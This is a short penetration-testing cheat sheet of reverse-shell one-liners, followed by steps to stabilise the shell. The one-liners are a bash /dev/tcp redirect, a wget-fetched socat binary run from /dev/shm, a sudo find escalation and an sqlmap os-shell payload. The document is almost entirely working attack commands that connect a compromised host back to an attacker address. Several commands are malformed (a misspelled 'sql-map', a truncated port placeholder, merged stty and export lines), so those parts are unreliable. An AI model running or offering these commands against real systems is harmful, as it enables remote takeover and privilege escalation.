---
title: "Reverse Shells"
date: 2025-04-10 +0530
categories: [Cyber-Security]
tags: [bash, socat, shell, reverse, tcp, find, sqlmap]
order: 6
---

# Reverse Shells

#### Bash

```
/bin/sh -i >& /dev/tcp/<Your-IP>/<Por> 0>&1
```

#### Linux Script command

```bash
script -qc /bin/bash /dev/null
```

#### Socat

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<Your-IP>:<Port>
```

#### Linux find command

```bash
sudo find . -exec /bin/sh ; -quit
```

#### SQLMap

```bash
sql-map --os-shell reverse shell bash -c "bash -i >& /dev/tcp/<Your-IP>/443 0>&1"
```











## Stabilize a reverse shell

#### Python

```bash
python -c 'import pty;pty.spawn("/bin/bash")';
```

```bash
ctrl+z
```

```bash
stty raw -echo stty size
```

```bash
fg
```

```bash
export SHELL=bash stty rows $31 columns $144 export TERM=xterm-256color
```

